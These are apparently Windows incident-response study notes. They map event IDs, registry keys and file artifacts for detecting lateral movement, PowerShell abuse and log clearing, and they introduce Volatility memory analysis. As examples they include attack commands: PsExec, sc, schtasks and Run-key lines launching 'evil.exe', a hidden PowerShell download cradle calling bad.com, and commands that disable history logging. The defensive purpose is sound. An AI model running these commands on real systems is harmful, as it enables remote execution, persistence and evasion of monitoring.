- Share Name: ```\\*\ADMIN$```
	- Windows Folder
	- Originaly designed to push patches
- Source Address: 127.0.0.1 (localhost)
	- Normally see remote host
- Account Name: COMPUTERNAME$
	- Normally see non-computer account



- Share Name: ```\\*\IPC$```
	- Sets up initial SMB connection
	- Part of authentication
	- Can be seen as part of enumeration tools
- Source Address: Remote Host
- Account Name: non-computer account

**Notes**
- Usually contains a corresponding 4624 event with Type 3 logon

Mandiant stated 24% of malware families they observed were cobalt strike



### Lateral Movement - Explicit Credentials - runas

- Track credential chagne common during lateral movement
- Event Id: 4624 (Logon Type 9)
- Event Id: 4648 (Logon using explicit credentials)

**Notes**
- Changing credentials necessary to move from system to system
- Typically only admins and attacks juggle multiple credentials
- 4648 events log on the originating system and help to identify attacker lateral movement from that system
- Logged if explicit credentials are supplied (even if no account change)
- RDP connections using different credentials often log 4648 events on both systems

**Detection**
- Originating Host - Event Id 4648
	- Subject
		- Account Name: Intitial Account Name
	- Account Whose Credentials Were Used
		- Account Name: "run as" account name
	- Target Server
		- Target Server Name: Remote Target
- Target System - Event Id 5140
	- Account Name: Should match account name of "Account Whose Credentials Were Used" from orginating host 4648 log
	- Source Address: Source IP of originating host
	- Share Name: Share accessed (IPC$, etc)
	- Computer: Computer name of remote host

**Cobalt Strike - Make Token or Pass the hash**

- EventID 4624
	- Logon Type 9 (explicit credentials)
	- "Subject - Account Name" matches "New Logon - Account Name"
	- Note Process information



- EventId 4648 (explicit credentials)
	- "Subject - Account Name" mathces "Account Whose Credentials Were Used - Account Name"
	- Note Target Server Name



### Lateral Movement - Scheduled Tasks

- Log: Task Scheduler - Security
	- 106 - 4698 - Task Created
	- 140 - 4720 - Task Updated
	- 141 - 4699 - Task Deleted
- Task Scheduler
	- 200/201: Task Executed/Completed
- Security
	- 4700/4701: Task Enabled/Disabled

**Notes**
- Tasks can be executed locally and remotely
	- Remotely scheduled task also cause Logon (ID 4624) Type 3 events
- Attackers commonly delete scheduled tasks after execution
	- Hunt deleted tasks (rare)
- Tasks running executables from /Temp likey evil

**Task Scheduler Artifacts**
- XML Files
- Saved in:
	- \Windows\System32\Tasks
	- \Windows\SysWOW64\Tasks
- Includes:
	- Task Name
	- Registration date and time (local)
	- Account used to register
	- Trigger conditions and frequency
	- Full command path
	- Account authenticated to run task



### Suspicious Services

- Analyze logs for suspicious services running at boot time
	- Service type changed to Boot
- Review services started and stopped during time of a suspected hack



- System Log
	- 7034: Service Crashed Unexpectedly
	- 7035: Service sent a Start/Stop control
	- 7036: Service started or stopped
	- 7040: Start typed changed (Boot, On Request, Disabled)
	- 7045: A new service was installed on the system (Win2008R2+)
- Security Log
	- 4697: A new service was installed on the system



**Notes**
- A large amount of malware and worms in the wild utilize Services
- Services started on bot illustrate peristence
- Services can crash due to attacks like process injections



**Example - PsExec**
- Filter by 7045 (New service installed)
- Look for services not tied to Built-In accounts (SIDs)
- Everytime PsExec runs, it starts a brand new service
- Note service File Name



### Event Log Clearing
- 1102: Audit Log Cleared (Security)
- 104: Audit Log Cleared (System)



**Notes**
- Requires Admin Rights
- GUI and command-line clearing (i.e. wevutil) recorded 
- Note Account Name

**Event Log Attacks**
- Mimikatz ```event::drop```
- DanderSpritz ```eventlogedit```
- ```Invoke-Phantom``` thread killing
- Event Log service suspension; memory based attacks



**Mitigation**
- Event Log Forwarding
- Logging "heartbeat"
- Log gap analysis



## Lateral Movement Tactics

- [Hunt Evil](./files/SANS_Hunt_Evil_Poster.pdf)


### RDP - Source System Artifacts
- VNC
	- 4624 Type 2 (Console)
- TeamViewer
	- TeamViewerX_Logfile.log (X = TV Version) - Source
	- Connections_incoming.txt - Destination

**Event Logs**
- Security.evtx
	- 4648 - Logon specifying alternate credentials - if NLA enabled on destination
		- Current logged on username
		- Alternate username
		- Destination Hostname/IP
		- Process Name
- Microsoft-Windows-TerminalServices-RDPClient%4Operational.evtx
	- 1024
		- Destination Hostname
	- 1102
		- Destination IP address



**Registry**
- Remote Desktop Destinations are tracked per-user
	- ```NTUSER\Software\Microsoft\Terminal Server Client\Servers```
- ShimCache - SYSTEM
	- mstsc.exe Remote Desktop Client
- BAM/DAM - SYSTEM - Last Time Executed
	- mstsc.exe Remote Desktop Client
- Amcache.hve - First Time Executed
	- mstsc.exe
- UserAssist - NTUSER.DAT
	- mstsc.exe Remote Desktop Client execution
	- Last Time Executed
	- Number of Times Executed
- RecentApps - NTUSER.DAT
	- mstsc.exe Remote Desktop Client Execution
	- Last Time Executed
	- Number of Times Executed
	- RecentItems subkey tracks connection destination and times



**File System**
- Jumplists ```C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\```
	- {MSTSC-APPID}-automaticdestinations-ms
	- Tracks remote desktop connection destination and times
- Prefetch ```C:\Windows\Prefetch\```
	- mstsc.exe-{hash}.pf
- Bitmap Cache ```C:\Users\<username>\AppData\Local\Microsoft\Terminal Server Client\Cache```
	- bcache##.bmc
	- cache####.bin
	- [Bitmap Cache Parser](https://github.com/ANSSI-FR/bmc-tools)



### RDP - Destination System Artifacts

**Event Logs**
- Security Event Log – security.evtx
	- 4624 Logon Type 10
 		- Source IP/Logon User Name
	- 4778/4779
		- IP Address of Source/Source
		- System Name
 		- Logon User Name
- Microsoft-WindowsRemoteDesktopServicesRdpCoreTS%4Operational.evtx
	- 131 – Connection Attempts
 		- Source IP
 	- 98 – Successful Connections
- Microsoft-Windows-Terminal Services-RemoteConnection Manager%4Operational.evtx
	- 1149
		- Source IP/Logon User Name
 			- Blank user name may indicate use of Sticky Keys
- Microsoft-Windows-Terminal Services-LocalSession Manager%4Operational.evtx
	- 21, 22, 25
		- Source IP/Logon User Name
	- 41
 		- Logon User Name



**Registry**
- ShimCache – SYSTEM
	- rdpclip.exe
	- tstheme.exe
- AmCache.hve – First Time Executed
 - rdpclip.exe
 - tstheme.exe



**File System**
- Prefetch ```C:\Windows\Prefetch\```
 - ```rdpclip.exe-{hash}.pf```
 - ```tstheme.exe-{hash}.pf```



### Windows Admin Shares - Source System Artifacts
- C$
- ADMIN$
- IPC$

**Event Logs**
- security.evtx
	- 4648 – Logon specifying alternate credentials
		- Current logged-on User Name
		- Alternate User Name
		- Destination Host Name/IP
		- Process Name
- Microsoft-Windows-SmbClient%4Security.evtx
	- 31001 – Failed logon to destination
		- Destination Host Name
		- User Name for failed logon
		- Reason code for failed destination logon (e.g. bad password)



**Registry**
- MountPoints2 – Remotely mapped shares ```NTUSER\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2```
- Shellbags – USRCLASS.DAT
	- Remote folders accessed inside an interactive session via Explorer by attackers
- ShimCache – SYSTEM
	- net.exe
	- net1.exe
- BAM/DAM – NTUSER.DAT – Last Time Executed
	- net.exe
	- net1.exe
- AmCache.hve – First Time Executed
	- net.exe
	- net1.exe

	```net use z: \\host\c$ /user:domain\username <password>```



**File System**
- Prefetch – ```C:\Windows\Prefetch\```
	- ```net.exe-{hash}.pf```
	- ```net1.exe-{hash}.pf```
- User Profile Artifacts
	- Review shortcut files and jumplists for remote files accessed by attackers, if they had interactive access (RDP)



### Windows Admin Shares -  Destination System Artifacts
- Stage malware/access sensitive files
- Pass-the-Hash attacks common
- Vista+ requires domain or built-in admin rights

**Event Logs**
- Security Event Log – security.evtx
	- 4624 Logon Type 3
		- Source IP/Logon User Name
- 4672
	- Logon User Name
	- Logon by user with administrative rights
	- Requirement for accessing default shares such as C$ and ADMIN$
- 4776 – NTLM if authenticating to Local System
	- Source Host Name/Logon User Name
- 4768 – TGT Granted
	- Source Host Name/Logon User Name
	- Available only on domain controller
- 4769 – Service Ticket Granted if authenticating to Domain Controller
	- Destination Host Name/Logon User Name
	- Source IP
	- Available only on domain controller
- 5140
	- Share Access
- 5145
	- Auditing of shared files – NOISY!



**File System**
- File Creation
	- Attacker's files (malware) copied to destination system
- Look for Modified Time before Creation Time
- Creation Time is time of file copy



### PsExec - Source System Artifacts

**Event Logs**
- security.evtx
	- 4648 – Logon specifying alternate credentials
		- Current logged-on User Name
		- Alternate User Name
		- Destination Host Name/IP
		- Process Name



**Registry**
- NTUSER.DAT
	- ```Software\SysInternals\PsExec\EulaAccepted```
- ShimCache – SYSTEM
	- psexec.exe
- BAM/DAM – SYSTEM – Last Time Executed
	- psexec.exe
- AmCache.hve – First Time Executed
	- psexec.exe



**File System**
- Prefetch – ```C:\Windows\Prefetch\psexec.exe-{hash}.pf```
- Possible references to other files accessed by psexec.exe, such as executables copied to target system with the “-c” option
- File Creation
	- psexec.exe file downloaded and created on local host as the file is not native to Windows

```psexec.exe \\host -accepteula -d -c c:\temp\evil.exe```




### PsExec - Destination System Artifacts
- Authenticates to destination system
- Named pipes are used to communicate
- Mounts hidden ADMIN$ share
- Copies PsExec.exe and other binaries to windows folder
- Executes code via a service (PSEXESVC)

**Event Logs**
- security.evtx
	- 4648 Logon specifying alternate credentials
		- Connecting User Name
		- Process Name
- 4624 Logon Type 3 (and Type 2 if “-u” Alternate Credentials are used)
	- Source IP/Logon User Name
- 4672
	- Logon User Name
	- Logon by a user with administrative rights
	- Requirement for access default shares such as C$ and ADMIN$
- 5140 – Share Access
	- ADMIN$ share used by PsExec
- system.evtx
	- 7045
		- Service Install



**Registry**
- New service creation configured in ```SYSTEM\CurrentControlSet\Services\PSEXESVC```
	- “-r” option can allow attacker to rename service
- ShimCache – SYSTEM
	- psexesvc.exe
- AmCache.hve First Time Executed
	- psexesvc.exe



**File System**
- Prefetch – ```C:\Windows\Prefetch\```  
		- ```psexesvc.exe-{hash}.pf```  
		- ```evil.exe-{hash}.pf```  
- File Creation
	- User profile directory structure created unless “-e” option used
- psexesvc.exe will be placed in ADMIN$ (\Windows) by default, as well as other executables (evil.exe) pushed by PsExec



### Windows Remote Management Tools
- Create and Start a remote service  
	- ```sc \\host create servicename binpath= “c:\temp\evil.exe”```  
	- ```sc \\host start servicename```  
- Remotely schedule tasks  
	- ```at \\host 13:00 "c:\temp\evil.exe"```  
	- ```schtasks /CREATE /TN taskname /TR c:\temp\evil.exe /SC once /RU “SYSTEM” /ST 13:00 /S host /U username```  
- Interact with Remote Registries  
	- ```reg add \\host\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Data /t REG_SZ /d "C:\evil.exe"```  
- Execute any remote command  
	- ```winrs -r:host -u:user command```  



### Remote Services - Source System Artifacts

**Registry**
- ShimCache – SYSTEM
	- ```sc.exe```  
- BAM/DAM – SYSTEM – Last Time Executed
	- ```sc.exe```  
-	AmCache.hve – First Time Executed
	- ```sc.exe```  



**File System**
- Prefetch – ```C:\Windows\Prefetch\```  
	- ```sc.exe-{hash}.pf```  



### Remote Services - Destination System Artifacts

**Event Logs**
- security.evtx
	- 4624 Logon Type 3
		- Source IP/Logon User Name
- 4697
	- Security records service install, if enabled
	- Enabling non-default Security events such as ID 4697 are particularly useful if only the Security logs are forwarded to a centralized log server
- system.evtx
	- 7034 – Service crashed unexpectedly
	- 7035 – Service sent a Start/Stop control
	- 7036 – Service started or stopped
	- 7040 – Start type changed _(Boot | On Request | Disabled)_
	- 7045 – A service was installed on the system



**Registry**
- ```SYSTEM\CurrentControlSet\Services\```
	- New service creation
- ShimCache – SYSTEM
	- evil.exe
	- ShimCache records existence of malicious service executable, unless implemented as a service DLL
- AmCache.hve – First Time Executed
	- evil.exe



**File System**
- File Creation
	- evil.exe or evil.dll malicious service executable or service DLL
- Prefetch – ```C:\Windows\Prefetch\```
	- ```evil.exe-{hash}.pf```




### Scheduled Tasks - Source System Artifacts

**Event Logs**
- security.evtx
	- 4648 – Logon specifying alternate credentials
		- Current logged-on User Name
		- Alternate User Name
		- Destination Host Name/IP
		- Process Name



**Registry**
-	ShimCache – SYSTEM
	- at.exe
	- schtasks.exe
-	BAM/DAM – SYSTEM – Last Time Executed
	- at.exe
	- schtasks.exe
- AmCache.hve -First Time Executed
	- at.exe
	- schtasks.exe



**File System**
- Prefetch – ```C:\Windows\Prefetch\```
	- ```at.exe-{hash}.pf```
	- ```schtasks.exe-{hash}.pf```



### Scheduled Tasks - Destination System Artifacts

**Event Logs**
- security.evtx
	- 4624 Logon Type 3
		- Source IP/Logon User Name
	- 4672
		- Logon User Name
		- Logon by a user with administrative rights Requirement for accessing default shares such as C$ and ADMIN$
	- 4698 – Scheduled task created
	- 4702 – Scheduled task updated
	- 4699 – Scheduled task deleted
	- 4700/4701 – Scheduled task enabled/disabled
- Microsoft-Windows-Task Scheduler%4Operational.evtx
	- 106 – Scheduled task created
	- 140 – Scheduled task updated
	- 141 – Scheduled task deleted
	- 200/201 – Scheduled task



**Registry**
- SOFTWARE
	- ```Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks```  
	- ```Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\```  
- ShimCache – SYSTEM
	- evil.exe
- AmCache.hve – First Time Executed
	- evil.exe



**File System**
- File Creation
	- evil.exe
	- Job files created in ```C:\Windows\Tasks```  
	- XML task files created in ```C:\Windows\System32\Tasks```  
		- Author tag under "RegistrationInfo" can identify:
			- Source system name
			- Creator username
- Prefetch – ```C:\Windows\Prefetch\```  
	- evil.exe-{hash}.pf



### WMI - Source System Artifacts
- Powerful lateral movement options
- Native to Windows OS

**Event Logs**
- security.evtx
	- 4648 – Logon specifying alternate credentials
		- Current logged-on User Name
		- Alternate User Name
		- Destination Host Name/IP
		- Process Name



**Registry**
- ShimCache – SYSTEM
	- wmic.exe
- BAM/DAM – SYSTEM – Last Time Executed
	- wmic.exe
- AmCache.hve – First Time Executed
	- wmic.exe



**File System**
- Prefetch – ```C:\Windows\Prefetch\```  
	- ```wmic.exe-{hash}.pf```  



### WMI - Destination System Artifacts
- wmiprvse.exe
- Microsoft-Windows-WMI-Activity/Operational

**Event Logs**
- security.evtx
	- 4624 Logon Type 3
		- Source IP/Logon User Name
- 4672
	- Logon User Name
	- Logon by an a user with administrative rights
- Microsoft-Windows-WMIActivity%4Operational.evtx
	- 5857
		- Indicates time of wmiprvse execution and path to provider DLL – attackers sometimes install malicious WMI provider DLLs
- 5860, 5861
	Registration of Temporary (5860) and Permanent (5861) Event Consumers. Typically used for persistence, but
can be used for remote execution.



**Registry**
- ShimCache – SYSTEM
	- scrcons.exe
	- mofcomp.exe
	- wmiprvse.exe
	- evil.exe
- AmCache.hve – First Time Executed
	- scrcons.exe
	- mofcomp.exe
	- wmiprvse.exe
	- evil.exe



**File System**
- File Creation
	- evil.exe
	- evil.mof – .mof files can be used to manage the WMI Repository
- Prefetch – ```C:\Windows\Prefetch\```  
	- ```scrcons.exe-{hash}.pf```  
	- ```mofcomp.exe-{hash}.pf```  
	- ```wmiprvse.exe-{hash}.pf```  
	- ```evil.exe-{hash}.pf```  
- Unauthorized changes to the WMI Repository in ```C:\Windows\system32\wbem\Repository```  



### Powershell Remoting - Source Sytem Artifacts

**Event Logs**
- security.evtx
	- 4648 – Logon specifying alternate credentials
		- Current logged-on User Name
		- Alternate User Name
		- Destination Host Name/IP
		- Process Name
- Microsoft-Windows-WinRM%4Operational.evtx
	- 6 – WSMan Session initialize
		- Session created
		- Destination Host Name or IP
		- Current logged-on User Name
	- 8, 15, 16, 33 – WSMan Session deinitialization
		- Closing of WSMan session
		- Current logged-on User Name
- Microsoft-Windows-PowerShell%4Operational.evtx
	- 40961, 40962
		- Records the local initiation of powershell.exe and associated user account
	- 8193 & 8194
		- Session created
	- 8197 - Connect
		- Session closed



**Registry**
- ShimCache – SYSTEM
	- powershell.exe
- BAM/DAM – SYSTEM – Last Time Executed
	- powershell.exe
- AmCache.hve – First Time Executed
	- powershell.exe



**File System**
- Prefetch – ```C:\Windows\Prefetch\```  
	- ```powershell.exe-{hash}.pf```  
	- PowerShell scripts (.ps1 files) that run within 10 seconds of powershell.exe launching will be tracked in powershell.exe prefetch file
- Command history 
	- ```C:\USERS\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt```  
	- With PS v5+, a history file with previous 4096 commands is maintained per user

```
Enter-PSSession –ComputerName host
Invoke-Command –ComputerName host –ScriptBlock {Start-Process c:\temp\evil.exe}
```



### Powershell Remoting - Destination Sytem Artifacts
- Source Process: powershell.exe
- Destination Process: wsmprovhost.exe

**Event Logs**
- security.evtx
 	- 4624 Logon Type 3
 		- Source IP/Logon User Name
 - 4672
 	- Logon User Name
 	- Logon by an a user with administrative rights
- Microsoft-WindowsPowerShell%4Operational.evtx
	- 4103, 4104 – Script Block logging
 		- Logs suspicious scripts by default in PS v5
 		- Logs all scripts if configured
	- 53504 Records the authenticating user
- Windows PowerShell.evtx
	- 400/403 "ServerRemoteHost" indicates start/end of Remoting session
 	- 800 Includes partial script code
- Microsoft-WindowsWinRM%4Operational.evtx
	- 91 Session creation
	- 168 Records the authenticating user



**Registry**
- ShimCache – SYSTEM
	- wsmprovhost.exe
	- evil.exe
- SOFTWARE
	- ```Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell\ExecutionPolicy```  
	- Attacker may change execution policy to a less restrictive setting, such as "bypass"
- AmCache.hve – First Time Executed
	- wsmprovhost.exe
 	- evil.exe



**File System**
- File Creation
	- evil.exe
	- With Enter-PSSession, a user profile directory may be created
- Prefetch – ```C:\Windows\Prefetch\```  
	- ```evil.exe-{hash].pf```  
	- ```wsmprovhost.exe-{hash].pf```  



### Application Deployment Software
- Patch Management Tools
- Cloud Control Panels (Azure, AWS, Google Cloud, etc.)



### Vulnerability Exploitation
- Crash Detection
	- Crash Reports
	- Event logs
- Process Tracking
	- Event ID 4688 (New process creation)
		- IIS worker process spawning command shells
	- Process anomalies
	- Code injection
- Threat Intel
- AV/HIPS/Exploit Guard Logging



## Commandline, PowerShell and WMI Analysis

### Evidence of Malware Execution

- System Event Log
	- Review Critical, Warning, and Error events for system and process crashes
- Application Event Log
	- EID 1000-1002
		- Windows Error Reporting (WER), Application crashes and hangs

**Notes**
- Note Crashed Applications, processes, and system reboots
- Review Windows Error Reports (Report.WER) written during times of interest
	- ```C:\Program Data\Microsoft\Windows\WER```
	- ```%User Profile%\AppData\Local\Microsoft\Windows\WER```
	- Includes Loaded DLLs and SHA1 hash
	- [Using .WER files to hunt evil](https://medium.com/dfir-dudes/amcache-is-not-alone-using-wer-files-to-hunt-evil-86bdfdb216d7)
- Windows Defender and/or AV logs should also be reviewed



### Process Tracking and Capturing Command Lines
- cmd.exe and powershell.exe
- EID 4688: New Process Created (includes executable path)
- EID 4689: Process Exit



**Notes**
- Available in Windows 7+
- Records account used, process info, and full command line
- Command line capture requires Process Tracking to be enabled (not on by default)
  - To Enable Recoding Full Command Lines in Process Reporting:
    - `Group Policy Management > Edit Policy > Computer Configuration > Policies > Administrative Templates > System > Audit Process Creation`
- Logon ID value can be used to link processes to a user session
- Note Parent/Child Process relationships



### WMI
- Enterprise information mangement framework designed to allow access to system data at scale
- WMIC.exe

**Recon**
- ```wmic process get CSName,Description,ExecutablePath,ProcessId```
- ```wmic useraccount list full```
- ```wmic group list full```
- ```wmic netuse list full```
- ```wmic qfe get Caption,Description,HotFixID,InstalledOn```
- ```wmic startup get Caption,Command,Location,User```

**Privilege Escalation**
- ```Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}```
- ```Get-WmiObject -Class win32_service | Where-Object {$_} | Where-Object {($_.pathname -ne $null) -and ($_.pathname.trim() -ne "")} | Where-Object {-not $_.pathname.StartsWith("`"")} | Where-Object {-not $_.pathname.StartsWith("'")} | Where-Object {($_.pathname.Substring(0, $_.pathname.IndexOf(".exe") + 4)) -match ".* .*"```
- ```Get-WmiObject -Class win32_process | Where-Object {$_} | ForEach-Object {$Owners[$_.handle] = $_.getowner().user}```
- From [PowerUp.ps1](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1)

**Lateral Movement**
- Process Call Create
- ```wmic.exe PROCESS CALL CREATE \"C:\\Windows\\System32\\rundll32.exe \\\"C:\\Windows\\perfc.dat\\\" #1```

**Event Logs**
- CommmandLine: ```C:\Windows\system32\wbem\wmic.exe" process call create "c:\Windows\system32\wscript.exe C:\egxifm\lkhqhtnbrvyo.vbs"```
- ImageFileName: ```\Device\HarddiskVolume1\Windows\SysWOW64\wbem\WMIC.exe```
- Event Logs (EID 4688)
- Microsoft Sysmon
- Commercial EDR Tools



### Auditing WMI Peristence
- Easily audit for malicious WMI event consumer
- EID 5858 records query errors, including host and username
- EID 5857-5861 record filter/consumer
- EID 5861 is the most useful: new permanent event consumer creation

**Notes**
- WMI-Activity/Operational Log
- Enabled by default on Win10 and Win2012R2+
- Event Filter and Consumer recorded in logs
- Both CommandLineEvent and ActiveScriptEvent consumers are logged



### Quick Wins - WMI-Activity/Operational Log
- EID 5861: New permanent consumers
- Create an WMI consumer allowlist
- WMIC commandlines in Process Tracking (Security Logs)
- EID 5857 tracks loaded provider dlls
- EID 5858 includes hostname and username
- Search for:
	- CommandLine
	- ActiveScript
	- scrcons
	- wbemcons
	- powershell
	- eval
	- .vbs
	- .ps1
	- ActiveXObject



### PowerShell Logging
- EID 4103: Module logging and pipeline output
- EID 4104: Script block logging
- EID 4105/4106: Script Start/Stop (not recommended)

**Notes**
- Powershell/Operational
	- Powershell downgrade attacks can circumvent logging and security by running ```powershell -Version 2 -Command <..>```
- Script block logging includes scripts and some deobfuscation
	- Script block: a collection of code that accomplishes a task
- Windows Powershell.evtx is older but still useful (EID 400/800)
- WinRM/Operational logs records inbound and outbound PowerShell Remoting
	- Destination Hostname, IP, Logged On user (EID 6)
	- Source of session creation (EID 91)
	- Authenticating user account (EID 168)

**Enable PowerShell Logging**
- GPO - "Turn on Powershell Script Block Logging"
- Suspicious scripts = "Warning" events

**PowerShell Stealth Syntax**
```powershell
powershell -w Hidden -nop -noni -exec bypass IEX (New-ObjectSystem.Net.WebClient.downloadstring('http://example.com/a'))
```
- -W: WindowStyle (often "hidden")
- -nop: NoProfile
- -noni: NonInteractive 
- -ec: EncodedCommand
- -exec: Execution Policy (often "bypass")
- IEX: Invoke-Expression (execute arbitrary commands, rarely used)
- (New-ObjectSystem.Net.WebClient).DownloadFile()
- Start-BitsTransfer
- Invoke-WebRequest



### Quick Wins - PowerShell
- PowerShell/Operational Log
	- EID 4103 records module/pipeline output
	- EID 4104 record code (scripts) executed (look for "Warning" events)
- PowerShell download cradle heavily used in the wild
	- ```IEX (New-Object Net.WebClient).dowloadstring("http://bad.com/bad.ps1")```
- Filter using commonly abused keywords
	- download
	- IEX
	- rundll32
	- http
	- Start-Process
	- Invoke-Expression
	- Invoke-Command
	- syswow64
	- FromBase64String
	- WebClient
	- bitstransfer
	- Reflection
	- powershell -version
	- Invoke-WmiMethod
	- Invoke-CimMethod
- Look for encoding and obfuscation
	- Character frequency analysis [Revoke-Obfuscation](https://github.com/danielbohannon/Revoke-Obfuscation)
	- [CyberChef](https://github.com/gchq/CyberChef)
	- [PSDecode](https://github.com/R3MRUM/PSDecode)
	- [Finding Encoded PS Scripts](https://www.youtube.com/watch?v=JWC7fzhvAY8
)



### PowerShell Transcript Logs
- Records input/output to the powershell terminal
- Not enabled by default (available in PS v4)
- Written to ```\Users\<account>\Documents```
- Can be auto forwarded
- GPO: Computer Configuration/Administrative Templates/Windows Components/Windows Powershell/Turn on Powershell Transcription

### PSReadline
- ```ConsoleHost_history.txt```
- ```%UserProfile%\Roaming\Microsoft\Windows\PowerShell\PSReadline```
- Records last 4096 commands typed in PS console (not ISE)
- Enabled by default in Win10/PowerShell v5
- Attackers can disable (or Remove PsReadLine module)
	- ```Set-PSReadLineOption -HistorySaveStyle SaveNothing```
	- ```Remove-Module -Name PsReadline```

### System Monitor (Sysmon) Logging
- Free Logging extention
- Built for DFIR investigations
- Easy configuration + pre-filtering
- Designed to scale and integrate with SIEMs:
  - Network activity
  - Process execution
  - Command lines
  - File hashes
  - File cration 
  - Creation time changes
  - Registry changes
  - DLL and driver loading
  - Remote thread creation (injection)
  - Named pipe creation
  - Alternate data streams
  - WMI Event Consumers
  - Raw disk access
- **ESSENTIALLY: the best set of logging you can have**, a light weight endpoint detection tool available for free.

---



# (3) Memory Forensics

**Capabilities**
- Archival of commandline data per process
- Recording of host-based netowrk activity, including local DNS cache, sockets, ARP, etc
- Tracking of new process handles and execution tracing
- Analyzing suspicious thread creation and memory allocation
- Identification of common DLL injection and hooking (rootkit) tehcniques



## Acquiring Memory

### Live System
- [WinPMEM](https://github.com/Velocidex/c-aff4)
- DumpIt
- F-Response and SANS SIFT
- [Belkasoft Live RAM Capturer](https://belkasoft.com/ram-capturer)
- [MagnetForensics Ram Capture](https://www.magnetforensics.com/resources/magnet-ram-capture/)



### Dead System

**Hibernation File**
- Contains a compressed RAM Image
- When PC goes into power save or hibernation mode from sleep mode
- ```%SystemDrive%\hiberfil.sys```



**Page and Swap Files**
- ```%SystemDrive%\pagefile.sys```  
- Parts of memory that were paged out to disk
- ```%SystemDrive%\swapfile.sys``` (Win8+\2012+)
- The working set of memory for suspended Modern apps that have been swapped to disk



**Memory Dump**
- ```%WINDIR%\MEMORY.DMP```
- Crash dump

### Hiberfil.sys
**Tools can decompress to raw**
- Volatility *imagecopy*
- Comae *hibr2bin.exe*
- Arsenal *Hibernation Recon*

**Tools that can analyze natively**
- BulkExtractor
- Magnet AXIOM
- Volatility
- Passware

### Virtual Machine Machines

**VMware**
- .vmem = raw memory 
- .vmss and .vmsn = memory image
- Suspend or Snapshot VM



**Microsoft Hyper-V**
- .bin = memory image
- .vsv = save state



**Parallels**
- .mem = raw memory image



**VirtualBox**
- .sav = partial memory image



## Memory Forensic Process
1. Collect Data for Analysis
	- Capture Raw Memory
	- Hibernation File
2. Put the Collected Into Context
	- Establish Context
		- Understand the disk, partitions, file system format
	- Find Key Memory Offsets
3. Analyze Results to Understand Meaning and Identify Important Elemets
	- Analyze Data for Significant Elements
	- Recover Evidence



## Memory Analysis
1. Identify Context
	- Find the Kernel Processor Control Region (KPCR), Kernel Debugger Data Block (KDGB), and/or Directory Table Base (DTB)
2. Parse Memory Structures
	- Executive Process (EPROCESS) blocks
		- All running proccess
	- Process Environment (PEB) blocks
		- Full commandlines (including arguements)
		- DLLs loaded
	- Virtual Address Descriptors (VAD) Tree
		- List of memory sections belonging to the process
		- Identify everthing that belongs to the process
		- (i.e. Dump entire powershell process to identify scripts)
	- Kernel Modules/Drivers
3. Scan for Outliers
	- Unlinked processes, DLLs, sockets, and threads (run code)
	- Unmapped memory pages with executive privilges
	- Hook detection
	- Known heuristics and signatures
4. Analysis: Search for Anomalies



<img src="./files/KDGB_flow.PNG">



## Volatility
- [Volatility](https://code.google.com/archive/p/volatility/)
- [Command Wiki](https://code.google.com/archive/p/volatility/wikis/CommandReference23.wiki)



**Basic Command Structure**

```vol.py -f [image] --profile=[profile] [plugin]```



**Using Volatility**

```vol.py -f memory.img --profile=Win10x64_19041 pslist```

- Set an environment variable to replace -f image
	- ```export VOLATILITY_LOCATION=file://<file path>```  

- Remove environment variables
	- ```unset VOLATILITY_LOCATION```  

- Volatility plug in location (SIFT)
	- ```/usr/local/src/Volatility/volatility/plugins/```  

- Get help (-h or --info)
	- ```vol.py malfind -h```
	- ```--info``` to see profiles and registered objects
	- [Command Info](https://github.com/volatilityfoundation/volatility/wiki/Command-Reference) 



**Volatility Profiles**
- Requires the system type for a memory image be specified using the --profile=[profile]
- Set environment variable
	- ```export VOLATILITY_PROFILE=Win10x64_16299```



### Image Identification
- Windows Specification Example
	- Edition: Windows 10 Pro
	- Version: 1709
	- OS Build: 16299.371
Document Version and Build During Collection
- The ```kdbgscan``` plugin can identify the build string
	- Provides Profile Suggestion, Build String, and KdCopyDataBlock
- [Volatility Profiles](https://github.com/volatilityfoundation/volatility/wiki/2.6-Win-Profiles)
- ```vol.py --info | grep Win10```
- Provide the KdCopyDataBlock to speed up runtimes
	- ```-g or --kdbg=```
	- ```vol.py -g 0xf801252197a4 --profile=Win10x64_16299 -f memory.img pslist```



**Hibernation File Conversion**
- ```imagecopy```
- Covert crash dumps and hibernation files to raw memory
- Output filename (-o)
- Provide correct image OS via (--profile=)
- Also works for VMware Snapshot and VirtualBox memory
- ```vol.py -f /memory/hiberfil.sys imagecopy -O hiberfil.raw --profile=WinXPSP2x86```



## Steps to Finding Evil 
1. Identify Rogue Processes
2. Analyze process DLLs and handles
3. Review network artifacts
4. Look for evidence of code injection
5. Check for signs of rootkit
6. Dump suspicious processes and drivers



## Identify Rogue Processes - Step 1
- Processes have a forward link (flink) and a back link (blink)
- EPROCESS block holds a majority of the metadata for a process
	- Name of process executable (image name)
	- Process Identifier (PID)
	- Parent PID
	- Location in memory (offset)
	- Creation Time
	- Termination (exit) time
	- Threads assigned to the process
	- Handles to other operating system artifacts
	- Link to the Virtual Address Descriptor tree
	- Link to the Process Environment Block



### Procces Analysis
- Image Name
	- Legitamate Process?
	- Spelled correctly?
	- Matches system context?
- Full Path
	- Appropriate path for system executable?
	- Running from a user or temp directory?
- Parent Process
	- Is the parent process what you would expect?
- Command Line
	- Executable matches image name?
	- Do arguments make sense?
- Start Time
	- Was the process started at boot (with other system processes)?
	- Process started near time of known attack
- Security IDs
	- Do the security identifiers make sense?
	- Why would a system process use a user account SID?



**Volatility Plugins**
- pslist - print all running processes within the EPROCESS doubly linked list
- psscan - scan physical memory for eprocess pool allocations
- pstree - print process list as a tree showing parent relationships (using EPROCESS linked list)
- malprocfind - automatically idetify suspicious system processes
- processbl - compare processes and loaded DLLs with a baseline image



### Pslist
- Print all running processes by following the EPROCESS linked list
- Show information for specific PIDs (-p)
- Provides the binary name (Name). parent process (PPID), and time started (Time)
- Thread (Thds) and Handle (Hnds) counts can reviewed for anomalies
- Rootkits can unlink malicous processes from the linked list, rendering them invisible to this tool
